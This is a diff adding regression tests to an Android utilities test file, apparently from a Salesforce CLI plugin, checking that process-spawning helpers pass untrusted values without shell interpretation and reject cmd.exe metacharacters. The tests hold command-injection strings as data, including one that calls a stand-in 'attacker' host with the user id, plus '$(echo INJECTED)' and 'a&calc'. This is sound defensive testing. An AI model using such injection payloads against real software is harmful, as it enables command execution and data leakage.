@@ -7,6 +7,7 @@
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
+import { EventEmitter } from 'node:events';
 import { TestContext } from '@salesforce/core/testSetup';
 import { stubMethod } from '@salesforce/ts-sinon';
 import { expect } from 'chai';
@@ -474,6 +475,72 @@ describe('Android utils', () => {
         stubMethod($$.SANDBOX, fs, 'existsSync').returns(true);
         const sdkRoot = AndroidUtils.getAndroidSdkRoot();
         expect(sdkRoot?.rootLocation).to.be.equal(mockAndroidHome);
+    });
+
+    it('createNewVirtualDevice passes untrusted values as inert argv elements (no shell)', async () => {
+        // A fake child process whose stdout immediately emits data so the promise resolves.
+        const fakeChild = new EventEmitter() as EventEmitter & {
+            stdin: { setDefaultEncoding: () => void; write: () => void };
+            stdout: EventEmitter;
+            stderr: EventEmitter;
+        };
+        fakeChild.stdin = { setDefaultEncoding: () => {}, write: () => {} };
+        fakeChild.stdout = new EventEmitter();
+        fakeChild.stderr = new EventEmitter();
+
+        const spawnChildStub = stubMethod($$.SANDBOX, AndroidUtils, 'spawnChild').returns(fakeChild);
+        // updateEmulatorConfig runs after creation; short-circuit it.
+        stubMethod($$.SANDBOX, AndroidUtils, 'updateEmulatorConfig').resolves();
+
+        setTimeout(() => fakeChild.stdout.emit('data', 'ok'), 10);
+
+        const malicious = 'evil; curl http://attacker/$(id); #';
+        await AndroidUtils.createNewVirtualDevice(malicious, 'google_apis', 'android-33', 'pixel', 'x86_64');
+
+        expect(spawnChildStub.calledOnce).to.be.true;
+        const [, args] = spawnChildStub.getCall(0).args as [string, string[]];
+        // Blanks are replaced with underscores, but metacharacters must survive intact and be
+        // carried as a single argv element (never split or interpreted by a shell).
+        expect(args).to.include(malicious.replace(/ /gi, '_'));
+        expect(args).to.include('system-images;android-33;google_apis;x86_64');
+    });
+
+    it('spawnChild passes a malicious argv element inertly (no shell interpretation)', async function () {
+        if (process.platform === 'win32') {
+            // On Windows spawnChild routes through cmd.exe and rejects metacharacters up front
+            // (see the dedicated rejection test below), so it never reaches a real process here.
+            this.skip();
+        }
+        // Spawn a real process on the POSIX detached path. If a shell were involved, the
+        // command-substitution argument would be evaluated instead of arriving verbatim; the
+        // untrusted value must be handed to the program as a single, literal argument.
+        const script = 'process.stdout.write(process.argv[process.argv.length - 1])';
+        const malicious = '$(echo INJECTED)';
+        const child = AndroidUtils.spawnChild(process.execPath, ['-e', script, malicious]);
+
+        const output: string[] = [];
+        child.stdout.on('data', (d: Buffer) => output.push(d.toString()));
+        await new Promise<void>((resolve, reject) => {
+            child.on('close', () => resolve());
+            child.on('error', reject);
+        });
+
+        expect(output.join('')).to.equal(malicious);
+    });
+
+    it('spawnChild rejects a cmd.exe metacharacter argv element on Windows', function () {
+        if (process.platform !== 'win32') {
+            this.skip(); // guard is Windows-only; POSIX passes these to execve inertly by design
+        }
+        // `a&calc` has no space/tab/" so libuv would leave it unquoted and cmd.exe would split on &.
+        // An embedded quote (`a"&calc`) breaks out of cmd's quote context (BatBadBut / CVE-2024-1874).
+        // Both must be rejected before reaching cmd.exe.
+        expect(() => AndroidUtils.spawnChild('avdmanager', ['create', 'avd', '-n', 'a&calc'])).to.throw(
+            /cannot be safely passed to cmd\.exe/
+        );
+        expect(() => AndroidUtils.spawnChild('avdmanager', ['create', 'avd', '-n', 'a"&calc'])).to.throw(
+            /cannot be safely passed to cmd\.exe/
+        );
     });
 
     it('Gets the latest version of cmdline tools', async () => {
